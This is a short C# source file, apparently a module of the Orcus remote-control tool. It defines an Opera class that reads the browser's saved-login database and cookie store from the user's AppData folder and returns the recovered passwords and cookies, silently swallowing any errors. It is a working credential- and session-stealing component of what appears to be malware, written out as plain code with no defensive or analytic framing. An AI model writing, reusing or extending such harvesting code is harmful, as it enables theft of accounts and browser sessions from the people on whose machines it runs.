using System;
using System.Collections.Generic;
using System.IO;
using Orcus.Commands.Passwords.Utilities;
using Orcus.Shared.Commands.Password;

namespace Orcus.Commands.Passwords.Applications.Opera;

internal class Opera : ICookieRecovery, IPasswordRecovery
{
	private const string ApplicationName = "Opera";

	public IEnumerable<RecoveredCookie> GetCookies()
	{
		try
		{
			return ChromiumBase.Cookies(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Opera Software\\Opera Stable\\Cookies"), "Opera");
		}
		catch (Exception)
		{
			return new List<RecoveredCookie>();
		}
	}

	public IEnumerable<RecoveredPassword> GetPasswords()
	{
		try
		{
			return ChromiumBase.Passwords(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Opera Software\\Opera Stable\\Login Data"), "Opera");
		}
		catch (Exception)
		{
			return new List<RecoveredPassword>();
		}
	}
}
